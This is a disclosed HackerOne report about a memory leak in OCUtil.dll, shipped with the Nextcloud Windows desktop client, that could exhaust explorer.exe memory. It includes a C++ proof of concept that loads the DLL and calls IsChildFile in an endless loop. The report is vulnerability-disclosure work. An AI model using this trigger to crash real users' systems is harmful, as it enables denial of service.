# Memory Leak in OCUtil.dll library in Desktop client can lead to DoS

## Report Details
- **Report ID**: 588562
- **URL**: https://hackerone.com/reports/588562
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-05-23T12:44:35.917Z
- **Disclosed**: 2020-08-06T13:56:55.155Z

## Reporter
- **Username**: cwave
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
The function IsChildFile(const wchar_t* rootFolder, const wchar_t* file) in FileUtil.cpp allocates memory on line 42 and fails to free it.

The following PoC code can provide evidence. The code and the PoC executable is attached to this report. Also OCUtils.dll and OCUtils_x64.dll library which is delivered with Nextclound Windows installer was included in the attachment.

Steps to reproduce:
1. Launch tests.exe (see attachment) or compile the attached VS2017 solution and launch the resulted executable
2. Make sure OCUtil_x64 library is in the System library path
3. Open Windows Task Manager and watch how the amount of memory for tests.exe process is increasing.

A Visual Studio debugging session screenshot is also attached whre you can see the memory in use.

#include "pch.h"
#include <iostream>
#include <windows.h>

typedef bool(__cdecl *f_IsChildFile)(const wchar_t* rootFolder, const wchar_t* file);

int main()
{
	HINSTANCE hGetProcIDDLL = LoadLibrary(L"OCUtil_x64.dll");

	if (!hGetProcIDDLL) {
		std::cout << "could not load the dynamic library" << std::endl;
		return EXIT_FAILURE;
	}

	f_IsChildFile isChildFile = (f_IsChildFile)GetProcAddress(hGetProcIDDLL, "?IsChildFile@FileUtil@@SA_NPEB_W0@Z");
	if (!isChildFile) {
		std::cout << "could not locate the function" << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "Function is at " << isChildFile;

	const wchar_t * folder = L"C:\\TestFolder";
	const wchar_t * file = L"C:\\As they rounded a bend in the path that ran beside the river, Lara recognized the silhouette of a fig tree atop a nearby hill. The weather was hot and the days were long. The fig tree was in full leaf, but not yet bearing fruit. Soon Lara spotted other";

	bool res; 

	while (1) {
		res = isChildFile(folder, file);
		std::cout << res << "\n";
	}

	return 0;
}

## Impact

Memory leaks have two common and sometimes overlapping causes:

- Error conditions and other exceptional circumstances.

- Confusion over which part of the program is responsible for freeing the memory.

In this case, the memory allocated in FileUtil.cpp at line 42 is not always freed or returned by the function.

Most memory leaks result in general software reliability problems, but if an attacker can intentionally trigger a memory leak, the attacker may be able to launch a denial of service attack (by crashing the program) or take advantage of other unexpected program behavior resulting from a low memory condition 

The function IsChildFile(const wchar_t* rootFolder, const wchar_t* file) is part of OCUtil.dll library which is delivered with Nextcloud Windows installer and it is loaded in explorer.exe process in order to provide context menu functionalities. 
By using the context menu functionality multiple times, explorer.exe could pottentialy run out of memory.

## Attachments
- VS_PoC.JPG
- nextcloud_memory_leak_poc.zip
